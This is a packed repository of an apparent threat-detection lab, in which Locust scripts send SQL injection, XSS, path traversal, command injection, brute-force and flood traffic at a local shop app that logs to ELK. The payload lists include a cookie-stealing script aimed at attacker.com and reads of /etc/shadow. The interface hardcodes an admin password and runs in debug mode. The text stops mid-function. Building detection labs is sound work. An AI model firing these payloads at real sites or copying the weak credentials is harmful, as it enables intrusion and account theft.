================================================================
Repopack Output File
================================================================

This file was generated by Repopack on: 2024-10-20T01:42:50.730Z

Purpose:
--------
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.

File Format:
------------
The content is organized as follows:
1. This header section
2. Repository structure
3. Multiple file entries, each consisting of:
  a. A separator line (================)
  b. The file path (File: path/to/file)
  c. Another separator line
  d. The full contents of the file
  e. A blank line

Usage Guidelines:
-----------------
1. This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
2. When processing this file, use the separators and "File:" markers to
  distinguish between different files in the repository.
3. Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.

Notes:
------
- Some files may have been excluded based on .gitignore rules and Repopack's
  configuration.
- Binary files are not included in this packed representation. Please refer to
  the Repository Structure section for a complete list of file paths, including
  binary files.



For more information about Repopack, visit: https://github.com/yamadashy/repopack

================================================================
Repository Structure
================================================================
db/init.sql
docker-compose.yml
interface/Dockerfile
interface/interface.py
interface/requirements.txt
interface/templates/dashboard.html
interface/templates/error.html
interface/templates/login.html
locust/__pycache__/dom_xss.txt
locust/__pycache__/reflected_xss.txt
locust/Dockerfile.locust
locust/locust_config.yaml
locust/locustfile.py
locust/logging_config.yaml
locust/payloads/dom_xss.txt
locust/payloads/reflected_xss.txt
locust/payloads/SQL.txt
locust/payloads/stored_xss.txt
locust/threat_locustfile.py
logstash/logstash.conf
logstash/logstash.yaml
threat_detector/detector_config.yaml
threat_detector/Dockerfile.detector
threat_detector/Dockerfile.responder
threat_detector/requirements.txt
threat_detector/responder_config.yaml
threat_detector/threat_detector.py
threat_detector/threat_responder.py
web/app.py
web/Dockerfile
web/requirements.txt

================================================================
Repository Files
================================================================

================
File: db/init.sql
================
CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10, 2) NOT NULL
);

INSERT INTO products (name, price) VALUES
    ('Laptop', 999.99),
    ('Smartphone', 599.99),
    ('Headphones', 149.99);

================
File: docker-compose.yml
================
services:
  db:
    image: postgres:13
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=password
      - POSTGRES_DB=ecommerce
    volumes:
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - app-network
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d ecommerce"]
      interval: 5s
      timeout: 5s
      retries: 5

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.14.0
    environment:
      - discovery.type=single-node
      - logger.level=WARN
    ports:
      - "9200:9200"
    networks:
      - app-network
    healthcheck:
      test: [ "CMD-SHELL", "curl -s http://localhost:9200 >/dev/null || exit 1" ]
      interval: 30s
      timeout: 10s
      retries: 5

  logstash:
    image: docker.elastic.co/logstash/logstash:7.14.0
    volumes:
      - ./logstash/logstash.conf:/usr/share/logstash/pipeline/logstash.conf
      - ./logstash/logstash.yaml:/usr/share/logstash/config/logstash.yaml
      - ./logs:/mnt/logs
    depends_on:
      - elasticsearch
    ports:
      - "5044:5044"
    networks:
      - app-network

  kibana:
    image: docker.elastic.co/kibana/kibana:7.14.0
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
      - LOGGING_ROOT_LEVEL=warn
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch
    networks:
      - app-network

  threat-detector:
    build:
      context: ./threat_detector
      dockerfile: Dockerfile.detector
    depends_on:
      elasticsearch:
        condition: service_healthy
    environment:
      - ELASTICSEARCH_HOST=elasticsearch
      - ELASTICSEARCH_PORT=9200
    volumes:
      - ./logs:/mnt/logs
    restart: unless-stopped
    networks:
      - app-network

  redis:
    image: redis:7.4-alpine
    ports:
      - "6379:6379"
    networks:
      - app-network
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 30s
      retries: 50

  web:
    build: ./web
    ports:
      - "5002:5000"
    depends_on:
      redis:
        condition: service_healthy
      db:
        condition: service_started
    environment:
      - DATABASE_URL=postgresql://user:password@db:5432/ecommerce
      - REDIS_URL=redis://redis:6379/0
      - REDIS_KEY_PREFIX="threat_responder:"
    networks:
      - app-network
    restart: unless-stopped

  locust:
    build:
      context: ./locust
      dockerfile: Dockerfile.locust
    ports:
      - "8089:8089"
    volumes:
      - ./locust:/mnt/locust
      - ./logs:/mnt/logs
    command: -f /mnt/locust/locustfile.py --headless -u ${NORMAL_USERS:-0} -r ${NORMAL_SPAWN_RATE:-1} --run-time ${RUN_TIME:-1h}
    environment:
      - LOCUST_HOST=http://web:5000
    depends_on:
      - web
    networks:
      - app-network

  threat-locust:
    build:
      context: ./locust
      dockerfile: Dockerfile.locust
    volumes:
      - ./locust:/mnt/locust
      - ./logs:/mnt/logs
    command: -f /mnt/locust/threat_locustfile.py --headless
    environment:
      - LOCUST_HOST=http://web:5000
    depends_on:
      - web
    networks:
      - app-network

  threat-responder:
    build:
      context: ./threat_detector
      dockerfile: Dockerfile.responder
    volumes:
      - ./logs:/mnt/logs
      - ./threat_detector/responder_config.yaml:/app/responder_config.yaml
    depends_on:
      - threat-detector
      - redis
    environment:
      - REDIS_URL=redis://redis:6379/0
      - REDIS_KEY_PREFIX="threat_responder:"
    networks:
      - app-network
    restart: unless-stopped

  inteface:
    build:
      context: ./interface
    ports: 
      - "5123:5123"
    depends_on:
      redis:
        condition: service_healthy
      db:
        condition: service_started
    networks:
      - app-network
    restart: unless-stopped

networks:
  app-network:
    driver: bridge

volumes:
  logs:

================
File: interface/Dockerfile
================
FROM python:3.12
WORKDIR /interface
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY interface.py .
ENV REDIS_KEY_PREFIX="threat_responder:"
CMD ["python", "interface.py"]

================
File: interface/interface.py
================
from flask import Flask, render_template, request, redirect, url_for, session, flash
import time

app = Flask(__name__, template_folder="templates")
app.secret_key = 'your_secret_key'

users = {
    'admin': 'password123'
}

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and users[username] == password:
            session['username'] = username
            flash('Login successful!')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password.')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    flash('You have been logged out.')
    return redirect(url_for('login'))

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if 'username' not in session:
        flash('Please log in to access the dashboard.')
        return redirect(url_for('login'))

    time_range = 'now-15m'  # Last 15 minutes
    auto_refresh = '30s'    # Default refresh interval

    if request.method == 'POST':
        time_range = request.form.get('time_range')
        auto_refresh = request.form.get('auto_refresh')

    kibana_url = f"http://your_kibana_ip:5601/app/kibana#/dashboard/12345678-1234-1234-1234-123456789abc?embed=true&_g=(time:(from:{time_range},to:now),refreshInterval:(pause:!f,value:{auto_refresh}))"
    return render_template('dashboard.html', kibana_url=kibana_url, time_range=time_range, auto_refresh=auto_refresh)

@app.errorhandler(500)
def internal_error(error):
    flash('An error occurred. Please try again later.')
    return render_template('error.html'), 500

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port=5123, debug=True)

================
File: interface/requirements.txt
================
Flask==2.3.2
Jinja2==3.1.2
requests==2.31.0
Flask-WTF==1.0.1

================
File: interface/templates/dashboard.html
================
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibana Dashboard</title>
</head>
<body>
    <h1>Kibana Dashboard</h1>

    <form method="POST">
        <label for="time_range">Time Range:</label>
        <select id="time_range" name="time_range">
            <option value="now-15m" {% if time_range == 'now-15m' %}selected{% endif %}>Last 15 minutes</option>
            <option value="now-1h" {% if time_range == 'now-1h' %}selected{% endif %}>Last 1 hour</option>
            <option value="now-24h" {% if time_range == 'now-24h' %}selected{% endif %}>Last 24 hours</option>
        </select><br>

        <label for="auto_refresh">Auto-Refresh Interval:</label>
        <select id="auto_refresh" name="auto_refresh">
            <option value="30s" {% if auto_refresh == '30s' %}selected{% endif %}>Every 30 seconds</option>
            <option value="1m" {% if auto_refresh == '1m' %}selected{% endif %}>Every 1 minute</option>
            <option value="5m" {% if auto_refresh == '5m' %}selected{% endif %}>Every 5 minutes</option>
        </select><br>

        <button type="submit">Update Dashboard</button>
    </form>

    <iframe src="{{ kibana_url }}" width="100%" height="600"></iframe>
    <a href="{{ url_for('logout') }}">Logout</a>
</body>
</html>

================
File: interface/templates/error.html
================
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error</title>
</head>
<body>
    <h1>Error</h1>
    <p>Sorry, an error occurred while loading the dashboard.</p>
    <a href="{{ url_for('dashboard') }}">Go back to Dashboard</a>
</body>
</html>

================
File: interface/templates/login.html
================
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    </form>
    {% for message in get_flashed_messages() %}
        <p>{{ message }}</p>
    {% endfor %}
</body>
</html>

================
File: locust/__pycache__/dom_xss.txt
================
#"><script>alert('DOM XSS')</script>
#<img src=x onerror=alert('DOM XSS')>
#<svg/onload=alert('DOM XSS')>
#"><iframe src=javascript:alert('DOM XSS')>
#"><body onload=alert('DOM XSS')>
#"><input onfocus=alert('DOM XSS') autofocus>
#"><button onclick=alert('DOM XSS')>Click Me</button>
#"><video><source onerror="javascript:alert('DOM XSS');"></video>
#"><math href="javascript:alert('DOM XSS')"></math>
#"><style>@import 'javascript:alert("DOM XSS")';</style>

================
File: locust/__pycache__/reflected_xss.txt
================
"><script>alert('Reflected XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('Reflected XSS')>
<script>window.location='http://attacker.com?cookie='+document.cookie</script>
<svg/onload=alert('Reflected XSS')>
'"><img src=x onerror=alert('Reflected XSS')>
"><body onload=alert('Reflected XSS')>
"><iframe src=javascript:alert('Reflected XSS')>
"><style>@import 'javascript:alert("Reflected XSS")';</style>
"><video><source onerror="javascript:alert('Reflected XSS');"></video>

================
File: locust/Dockerfile.locust
================
FROM locustio/locust

# Install additional dependencies
RUN pip install pyyaml

# Copy the config file into the image
COPY locust_config.yaml /mnt/locust/locust_config.yaml
COPY logging_config.yaml /mnt/locust/logging_config.yaml

# Set the working directory
WORKDIR /mnt/locust

================
File: locust/locust_config.yaml
================
# General settings
host: http://web:5000
run_time: 1h

# Normal users settings
normal_users:
  count: 10
  spawn_rate: 1
  wait_time_min: 1
  wait_time_max: 5

# Threat users settings
threat_users:
  count: 10
  spawn_rate: 1
  wait_time_min: 1
  wait_time_max: 10
  sql_injection:
    enabled: true
    weight: 3
  xss:
    enabled: true
    weight: 3
  path_traversal:
    enabled: true
    weight: 2
  command_injection:
    enabled: true
    weight: 2
  brute_force:
    enabled: false
    weight: 2
  web_scraping:
    enabled: false
    weight: 2
  ddos:
    enabled: false
    weight: 2

# User lifecycle management
lifecycle:
  check_interval: 5  # seconds
  deactivation_chance: 0.1
  activation_chance: 0.3
  min_cooldown: 10  # seconds
  max_cooldown: 30  # seconds

# Logging
log_dir: /mnt/logs

================
File: locust/locustfile.py
================
import random
import json
import logging
import time
import uuid
import os
from locust import HttpUser, task, between, events
from locust.contrib.fasthttp import FastHttpUser
from datetime import datetime
import gevent
import yaml

config_path = "/mnt/locust/locust_config.yaml"
with open(config_path, "r") as config_file:
    config = yaml.safe_load(config_file)

logging_config_path = "/mnt/locust/logging_config.yaml"
with open(logging_config_path, 'rt') as f:
    logging_config = yaml.safe_load(f.read())
    logging.config.dictConfig(logging_config)

json_logger = logging.getLogger('json_logger')
user_stats_logger = logging.getLogger('normal_user_stats')

class DynamicWebsiteUser(FastHttpUser):
    wait_time = between(config['normal_users']['wait_time_min'], config['normal_users']['wait_time_max'])
    host = config['host']
    instances = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__class__.instances.append(self)
        self.is_active = False
        self.last_active_time = time.time()
        self.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'], config['lifecycle']['max_cooldown'])
        self.randomise_user()

    def randomise_user(self):
        self.user_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        self.client_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.username = random.choice([
            'applebee',
            'ofgirl',
            'bigbuffmen',
            'alphagamer101',
            'donaldtrump'
        ])
        self.password = random.choice([
            'password',
            '123456',
            'admin',
            'qwerty',
            'letmein'
        ])
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
        ])
        self.geolocation = random.choice([
            {"country": "United States", "city": "New York", "timezone": "America/New_York"},
            {"country": "United Kingdom", "city": "London", "timezone": "Europe/London"},
            {"country": "Japan", "city": "Tokyo", "timezone": "Asia/Tokyo"},
            {"country": "Australia", "city": "Sydney", "timezone": "Australia/Sydney"},
            {"country": "Germany", "city": "Berlin", "timezone": "Europe/Berlin"}
        ])

    def on_start(self):
        self.is_active = True
        self.last_active_time = time.time()

    def on_stop(self):
        self.__class__.instances.remove(self)

    @task(10)
    def index_page(self):
        if not self.is_active:
            return
        self._log_request("GET", "/", None)

    @task(5)
    def view_product(self):
        if not self.is_active:
            return
        product_id = random.randint(1, 10)
        self._log_request("GET", f"/products/{product_id}", None)

    @task(2)
    def add_to_cart(self):
        if not self.is_active:
            return
        product_id = random.randint(1, 10)
        self._log_request("POST", "/cart", {"product_id": product_id, "quantity": 1})

    @task(2)
    def view_cart(self):
        if not self.is_active:
            return
        self._log_request("GET", "/cart", None)

    @task(1)
    def checkout(self):
        if not self.is_active:
            return
        self._log_request("POST", "/checkout", {"payment_method": "credit_card"})

    @task(1)
    def login(self):
        if not self.is_active:
            return
        self._log_request("POST", "/login", {"username": self.username, "password": self.password})

    @task(2)
    def search(self):
        if not self.is_active:
            return
        search_terms = ["laptop", "phone", "book", "shirt", "headphones"]
        query = random.choice(search_terms)
        self._log_request("GET", f"/search?q={query}", None)

    def _log_request(self, method, path, data):
        log_id = str(uuid.uuid4())
        start_time = time.time()
        try:
            if method == "GET":
                response = self.client.get(path)
            elif method == "POST":
                response = self.client.post(path, json=data)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            self._log_response(log_id, method, path, response, start_time, data)
        except Exception as e:
            self._log_exception(log_id, method, path, e, start_time, data)

    def _log_response(self, log_id, method, path, response, start_time, data):
        log_entry = {
            "log_id": log_id,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": response.status_code,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "bytes_sent": len(response.request.body) if response.request.body else 0,
            "bytes_received": len(response.content),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com"]),
            "request_headers": dict(response.request.headers),
            "response_headers": dict(response.headers),
            "geo": self.geolocation,
            "request_body": data if data else None
        }
        json_logger.info(json.dumps(log_entry))

    def _log_exception(self, log_id, method, path, exception, start_time, data):
        log_entry = {
            "log_id": log_id,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": 500,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "exception": str(exception),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "geo": self.geolocation,
            "request_body": data if data else None
        }
        json_logger.info(json.dumps(log_entry))


def manage_user_lifecycle(environment):
    for user_instance in DynamicWebsiteUser.instances:
        current_time = time.time()
        if user_instance.is_active:
            if random.random() < config['lifecycle']['deactivation_chance']:
                user_instance.is_active = False
                user_instance.last_active_time = current_time
                user_instance.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'], config['lifecycle']['max_cooldown'])
                logging.info(f"User {user_instance.user_id} deactivated")
        elif current_time - user_instance.last_active_time > user_instance.activation_cooldown:
            if random.random() < config['lifecycle']['activation_chance']:
                user_instance.is_active = True
                user_instance.last_active_time = current_time
                logging.info(f"User {user_instance.user_id} activated")

def log_user_stats(environment):
    active_users = sum(1 for user in DynamicWebsiteUser.instances if user.is_active)
    inactive_users = len(DynamicWebsiteUser.instances) - active_users
    log_message = f"Normal User Statistics: Active: {active_users}, Inactive: {inactive_users}"
    user_stats_logger.info(log_message)

@events.init.add_listener
def on_locust_init(environment, **kwargs):
    gevent.spawn(periodic_tasks, environment)

def periodic_tasks(environment):
    while True:
        manage_user_lifecycle(environment)
        log_user_stats(environment)
        gevent.sleep(config['lifecycle']['check_interval'])

================
File: locust/logging_config.yaml
================
version: 1
disable_existing_loggers: False
formatters:
  simple:
    format: "%(asctime)s - %(message)s"
  json:
    format: "%(message)s"

handlers:
  console:
    class: logging.StreamHandler
    level: INFO
    formatter: simple
    stream: ext://sys.stdout

  json_file:
    class: logging.FileHandler
    level: INFO
    formatter: json
    filename: /mnt/logs/locust_json.log
    encoding: utf8

  normal_user_stats:
    class: logging.FileHandler
    level: INFO
    formatter: simple
    filename: /mnt/logs/normal_user_stats.log
    encoding: utf8

  threat_user_stats:
    class: logging.FileHandler
    level: INFO
    formatter: simple
    filename: /mnt/logs/threat_user_stats.log
    encoding: utf8

loggers:
  json_logger:
    level: INFO
    handlers: [json_file]
    propagate: False

  normal_user_stats:
    level: INFO
    handlers: [normal_user_stats]
    propagate: False

  threat_user_stats:
    level: INFO
    handlers: [threat_user_stats]
    propagate: False

root:
  level: INFO
  handlers: [console]

================
File: locust/payloads/dom_xss.txt
================
#"><script>alert('DOM XSS')</script>
#<img src=x onerror=alert('DOM XSS')>
#<svg/onload=alert('DOM XSS')>
#"><iframe src=javascript:alert('DOM XSS')>
#"><body onload=alert('DOM XSS')>
#"><input onfocus=alert('DOM XSS') autofocus>
#"><button onclick=alert('DOM XSS')>Click Me</button>
#"><video><source onerror="javascript:alert('DOM XSS');"></video>
#"><math href="javascript:alert('DOM XSS')"></math>
#"><style>@import 'javascript:alert("DOM XSS")';</style>

================
File: locust/payloads/reflected_xss.txt
================
"><script>alert('Reflected XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('Reflected XSS')>
<script>window.location='http://attacker.com?cookie='+document.cookie</script>
<svg/onload=alert('Reflected XSS')>
'"><img src=x onerror=alert('Reflected XSS')>
"><body onload=alert('Reflected XSS')>
"><iframe src=javascript:alert('Reflected XSS')>
"><style>@import 'javascript:alert("Reflected XSS")';</style>
"><video><source onerror="javascript:alert('Reflected XSS');"></video>

================
File: locust/payloads/SQL.txt
================
' OR '1'='1
' UNION SELECT username, password FROM users--
admin'--
1; DROP TABLE users--
' OR 1=1--
' UNION SELECT null, version()--
' AND 1=2 UNION SELECT null, null--
' OR 'x'='x'--
1; EXEC xp_cmdshell('ping 127.0.0.1')--

================
File: locust/payloads/stored_xss.txt
================
<script>alert('Stored XSS')</script>
<img src="x" onerror="alert('Stored XSS')">
<iframe src="javascript:alert('Stored XSS');"></iframe>
<svg/onload=alert('Stored XSS')>
<marquee/onstart=alert('Stored XSS')>
<math href="javascript:alert('Stored XSS')"></math>
<body onload=alert('Stored XSS')>
"><script>alert('Stored XSS')</script>
<style>@import 'javascript:alert("Stored XSS")';</style>
<video><source onerror="javascript:alert('Stored XSS');"></video>

================
File: locust/threat_locustfile.py
================
import random
import json
import logging
import time
import uuid
import os
from locust import HttpUser, task, between, events
from locust.runners import MasterRunner
from locust.shape import LoadTestShape
from datetime import datetime
import gevent
import yaml
import urllib.parse
import secrets

config_path = "/mnt/locust/locust_config.yaml"
with open(config_path, "r") as config_file:
    config = yaml.safe_load(config_file)

logging_config_path = "/mnt/locust/logging_config.yaml"
with open(logging_config_path, 'rt') as f:
    logging_config = yaml.safe_load(f.read())
    logging.config.dictConfig(logging_config)

json_logger = logging.getLogger('json_logger')
user_stats_logger = logging.getLogger('threat_user_stats')


class UserManager:
    def __init__(self):
        self.users = {}
        self.user_classes = set()

    def add_user(self, user):
        self.users[user.user_id] = user
        self.user_classes.add(user.__class__)

    def remove_user(self, user):
        self.users.pop(user.user_id, None)

    def get_stats(self):
        stats = {cls: {'spawned': 0, 'active': 0} for cls in self.user_classes}
        for user in self.users.values():
            stats[user.__class__]['spawned'] += 1
            if user.is_active:
                stats[user.__class__]['active'] += 1
        return stats


user_manager = UserManager()


class DynamicMaliciousUser(HttpUser):
    wait_time = between(config['threat_users']['wait_time_min'], config['threat_users']['wait_time_max'])
    abstract = True
    host = config['host']
    instances = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__class__.instances.append(self)
        self.is_active = False
        self.last_active_time = time.time()
        self.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'],
                                                  config['lifecycle']['max_cooldown'])
        self.randomuser()
        user_manager.add_user(self)

    def randomuser(self):
        self.user_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        self.client_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'sqlmap/1.4.7#stable (http://sqlmap.org)',
            'Nikto/2.1.6',
            'Acunetix-WebVulnerability-Scanner/1.0',
        ])
        self.geolocation = random.choice([
            {"country": "Russia", "city": "Moscow", "timezone": "Europe/Moscow"},
            {"country": "China", "city": "Beijing", "timezone": "Asia/Shanghai"},
            {"country": "United States", "city": "Ashburn", "timezone": "America/New_York"},
            {"country": "Netherlands", "city": "Amsterdam", "timezone": "Europe/Amsterdam"},
        ])

    def get_headers(self):
        return {
            'X-Forwarded-For': self.client_ip,
            'User-Agent': self.user_agent
        }

    def on_start(self):
        self.is_active = True
        self.last_active_time = time.time()

    def on_stop(self):
        user_manager.remove_user(self)

    @staticmethod
    def load_payloads(filename):
        try:
            with open(f'/mnt/locust/payloads/{filename}', 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            logging.error(f"Payload file not found: {filename}")
            return []

    @task(2)
    def sql_injection_attempt(self):
        if not self.is_active:
            return
        payloads = self.load_payloads('SQL.txt')
        if not payloads:
            return
        payload = random.choice(payloads)
        self._log_request("GET", f"/products?id={payload}", None, "sql_injection")

    @task(2)
    def xss_attempt(self):
        if not self.is_active:
            return
        payload_files = ['stored_xss.txt', 'reflected_xss.txt', 'dom_xss.txt']
        selected_file = secrets.choice(payload_files)
        payloads = self.load_payloads(selected_file)
        if not payloads:
            return

        payload = secrets.choice(payloads)
        encoded_payload = urllib.parse.quote(payload)

        if selected_file == 'stored_xss.txt':
            data = {"comment": payload}
            self._log_request("POST", "/submit_comment", data, "xss_stored")
        elif selected_file == 'reflected_xss.txt':
            url = f"/search?q={encoded_payload}"
            self._log_request("GET", url, None, "xss_reflected")
        elif selected_file == 'dom_xss.txt':
            url = f"/page#payload={encoded_payload}"
            self._log_request("GET", url, None, "xss_dom")

    @task(2)
    def brute_force_login(self):
        if not self.is_active:
            return
        usernames = ['admin', 'root', 'user', 'test', 'guest', 'applebee', 'ofgirl', 'bigbuffmen', 'alphagamer101',
                     'donaldtrump']
        passwords = ['password', '123456', 'admin', 'qwerty', 'letmein', 'nonosquare']

        for username in usernames:
            for password in passwords:
                self.randomuser()
                self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")

    @task(1)
    def path_traversal_attempt(self):
        if not self.is_active:
            return
        choice = random.randint(1, 3)
        if choice == 1:
            retries = random.randint(1, 5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                ]
                payload = random.choice(payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 2:
            retries = random.randint(1, 5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "../../../var/log/auth.log",  # Linux auth logs
                    "../../../var/www/html/config.php",  # PHP config files
                    "..\\..\\..\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat",  # Windows user data
                    "..\\..\\..\\Program Files\\Common Files\\system\\ole db\\msdasqlr.dll",  # Windows DLL
                    "../../../etc/shadow",  # Linux shadow file
                    "../../../opt/tomcat/conf/tomcat-users.xml"  # Tomcat configuration
                ]
                encoded_payloads = [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
                ]

                payload = random.choice(payloads + encoded_payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 3:
            retries = random.randint(1, 5)
            for _ in range(retries):
                depth = random.randint(1, 6)
                traversal = "../" * depth
                file_target = random.choice([
                    "etc/passwd",
                    "etc/hosts",
                    "var/log/apache2/access.log",
                    "windows/win.ini"
                ])

                payload = f"{traversal}{file_target}"
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")

    @task(1)
    def command_injection_attempt(self):
        if not self.is_active:
            return
        payloads = [
            "; cat /etc/passwd",
            "& ipconfig",
            "| ls -la",
            "`whoami`",
            "$(echo 'vulnerable')",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/exec?cmd=date{payload}", None, "command_injection")

    @task(2)
    def web_scraping(self):
        if not self.is_active:
            return
        randomuser = random.randint(1, 2)
        choice = random.randint(1, 3)
        if choice == 1:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", "/information", "/aboutus"]
            for page in pages:
                self.randomuser()
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 2:
            search_terms = ["laptop", "phone", "book", "shirt", "headphones", "tablet", "watch", "camera", "shoes",
                            "jacket", "backpack", "sunglasses", "speaker", "smartwatch", "keyboard", "mouse", "charger",
                            "t-shirt", "monitor", "desk"]
            pages = ["/products", "/categories", "/reviews", "/comments", "/information"]
            for term in search_terms:
                page = random.choice(pages)
                if randomuser == 1:
                    self.randomuser()
                data = {"search_term": term}
                self._log_request("POST", page, data, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 3:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
            for page in pages:
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time

    @task(2)
    def ddos_simulation(self):
        if not self.is_active:
            return
        randomuser = random.randint(1, 2)
        for _ in range(random.randint(5, 15)):
            # Randomize user_id, session_id, client_ip, and user_agent
            if randomuser == 1:
                self.randomuser()

            actions = [
                lambda: self._log_request("GET", "/", None, "ddos"),
                lambda: self._log_request("GET", f"/products/{random.randint(1, 10)}", None, "ddos"),
                lambda: self._log_request("POST", "/cart", {"product_id": random.randint(1, 10), "quantity": 1},
                                          "ddos"),
                lambda: self._log_request("GET", "/cart", None, "ddos"),
                lambda: self._log_request("POST", "/checkout", {"payment_method": "credit_card"}, "ddos")
            ]

            for _ in range(random.randint(1, 20)):
                random.choice(actions)()

    def _log_request(self, method, path, data, threat_type):
        log_id = str(uuid.uuid4())
        start_time = time.time()
        headers = self.get_headers()
        try:
            if method == "GET":
                response = self.client.get(path, headers=headers)
            elif method == "POST":
                response = self.client.post(path, json=data, headers=headers)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            self._log_response(log_id, method, path, response, start_time, data, threat_type)
        except Exception as e:
            self._log_exception(log_id, method, path, e, start_time, data, threat_type)

    def _log_response(self, log_id, method, path, response, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": response.status_code,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "bytes_sent": len(response.request.body) if response.request.body else 0,
            "bytes_received": len(response.content),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "request_headers": self.get_headers(),
            "response_headers": dict(response.headers),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
